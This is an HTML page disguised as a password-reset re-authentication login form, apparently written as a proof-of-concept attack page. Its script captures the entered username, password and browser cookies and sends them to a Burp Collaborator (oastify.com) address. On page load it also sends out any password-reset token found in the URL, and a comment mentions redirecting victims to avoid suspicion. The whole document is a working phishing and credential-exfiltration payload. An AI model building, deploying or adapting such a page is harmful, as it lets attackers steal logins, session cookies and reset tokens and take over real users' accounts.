<!DOCTYPE html>
<html>
<head>
  <title>Login Required</title>
  <style>
    body { font-family: Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; background: #f0f0f0; }
    .login-box { background: white; padding: 20px; border-radius: 8px; box-shadow: 0 0 10px rgba(0,0,0,0.1); width: 300px; text-align: center; }
    input { width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ccc; border-radius: 4px; }
    button { background: #007bff; color: white; padding: 10px; border: none; border-radius: 4px; cursor: pointer; width: 100%; }
    button:hover { background: #0056b3; }
  </style>
</head>
<body>
  <div class="login-box">
    <h2>Login Required</h2>
    <p>Please re-authenticate to reset your password.</p>
    <input type="text" id="username" placeholder="Username or Email">
    <input type="password" id="password" placeholder="Password">
    <button onclick="captureCredentials()">Login</button>
  </div>

  <script>
    function captureCredentials() {
      const username = document.getElementById('username').value;
      const password = document.getElementById('password').value;
      const cookies = document.cookie || 'none';
      const data = `username=${encodeURIComponent(username)}&password=${encodeURIComponent(password)}&cookies=${encodeURIComponent(cookies)}`;

      // Exfiltrate to Burp Collaborator
      const collaboratorUrl = 'https://97efvbftrobz7esa3qfi8icia9gz4o.oastify.com'; // Replace with your Burp Collaborator URL
      fetch(collaboratorUrl + '?' + data, { mode: 'no-cors' })
        .catch(() => {}); // Ignore CORS errors for PoC

      // Optionally, redirect to avoid suspicion
    }

    // Capture reset token from URL (if present)
    const urlParams = new URLSearchParams(window.location.search);
    const resetToken = urlParams.get('token') || 'none';
    if (resetToken !== 'none') {
      fetch('https://97efvbftrobz7esa3qfi8icia9gz4o.oastify.com?token=' + encodeURIComponent(resetToken), { mode: 'no-cors' })
        .catch(() => {});
    }
  </script>
</body>
</html>
